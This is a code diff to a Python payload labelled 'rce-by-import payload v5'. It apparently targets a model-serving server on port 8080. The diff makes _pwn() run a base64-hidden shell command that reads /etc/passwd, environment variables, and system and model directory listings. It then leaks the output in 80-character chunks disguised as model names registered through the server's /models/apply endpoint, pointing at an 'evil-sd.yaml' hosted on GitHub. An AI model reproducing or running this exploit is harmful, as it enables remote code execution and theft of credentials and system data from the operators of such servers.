@@ -1,11 +1,11 @@
-# rce-by-import payload
+# rce-by-import payload v5 - long output segmented exfil
 import os, subprocess, base64, threading, json, urllib.request
 
 def _pwn():
     try:
         import base64 as b
-        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgY2F0IC9ldGMvcGFzc3dkIHwgaGVhZCAtMjA7IGxzIC1sYSAvbW9kZWxzIHwgaGVhZCAtMjA=").decode()
-        out = subprocess.check_output(cmd, shell=True, timeout=15, stderr=subprocess.STDOUT)
+        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgZWNobyAnLS0tUEFTU1dELS0tJzsgY2F0IC9ldGMvcGFzc3dkOyBlY2hvICctLS1FTlYtLS0nOyBlbnYgfCBoZWFkIC0zMDsgZWNobyAnLS0tTU9ERUxTLS0tJzsgbHMgLWxhIC9tb2RlbHMgfCBoZWFkIC0zMDsgZWNobyAnLS0tUk9PVC0tLSc7IGxzIC1sYSAvIHwgaGVhZCAtMzA=").decode()
+        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
         out_s = out.decode(errors="replace")
         for d in ["/models", "/tmp"]:
             try:
@@ -14,14 +14,17 @@ def _pwn():
             except Exception:
                 pass
         b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
-        name = "ZZ--" + b64[:120]
-        try:
-            req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
-                data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
-                headers={"Content-Type": "application/json"})
-            urllib.request.urlopen(req, timeout=5)
-        except Exception:
-            pass
+        # 分段注册: 每段80字符
+        for i in range(0, len(b64), 80):
+            seg = b64[i:i+80]
+            name = f"ZZ--{seg}"
+            try:
+                req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
+                    data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
+                    headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req, timeout=5)
+            except Exception:
+                pass
     except Exception:
         pass
 
